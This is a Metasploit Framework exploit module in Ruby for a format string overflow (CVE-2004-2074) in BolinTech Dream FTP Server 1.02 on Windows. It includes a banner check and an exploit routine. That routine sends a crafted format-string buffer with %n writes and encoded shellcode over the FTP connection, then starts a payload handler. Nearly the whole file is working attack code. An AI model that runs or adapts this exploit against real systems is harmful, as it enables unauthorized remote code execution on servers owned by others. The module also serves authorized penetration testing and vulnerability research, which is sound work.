##
# $Id: dreamftp_format.rb 9583 2010-06-22 19:11:05Z todb $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'BolinTech Dream FTP Server 1.02 Format String',
			'Description'	=> %q{
					This module exploits a format string overflow in the BolinTech
				Dream FTP Server version 1.02. Based on the exploit by SkyLined.
			},
			'Author' 		=> [ 'Patrick Webster <patrick[at]aushack.com>' ],
			'Arch'		=> [ ARCH_X86 ],
			'License'        	=> MSF_LICENSE,
			'Version'        	=> '$Revision: 9583 $',
			'References'     =>
				[
					[ 'CVE', '2004-2074'],
					[ 'OSVDB', '4986'],
					[ 'BID', '9800'],
					[ 'URL', 'http://www.milw0rm.com/exploits/823'],
				],
			'Platform' 	=> ['win'],
			'Privileged'	=> false,
			'Payload'		=>
				{
					'Space'			=> 1000,
					'BadChars'		=> "\x00\x0a\x0d",
					'StackAdjustment'	=> -3500,
				},
			'Targets' 		=>
			[
				# Patrick - Tested OK 2007/09/10 against w2ksp0, w2ksp4 en.
				[
					'Dream FTP Server v1.02 Universal',
					{
						'Offset'			=> 3957680, # 0x3c63ff-0x4f
					}
				],
			],
			'DisclosureDate' => 'Mar 03 2004',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(21),
			], self.class)
	end

	def check
		connect
		banner = sock.get(-1,3)
		disconnect
		if (banner =~ /Dream FTP Server/)
			return Exploit::CheckCode::Appears
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect
		select(nil,nil,nil,0.25)
		sploit = "\xeb\x29"
		sploit << "%8x%8x%8x%8x%8x%8x%8x%8x%" + target['Offset'].to_s + "d%n%n"
		sploit << "@@@@@@@@" + payload.encoded
		sock.put(sploit + "\r\n")
		select(nil,nil,nil,0.25)
		handler
		disconnect
	end

end
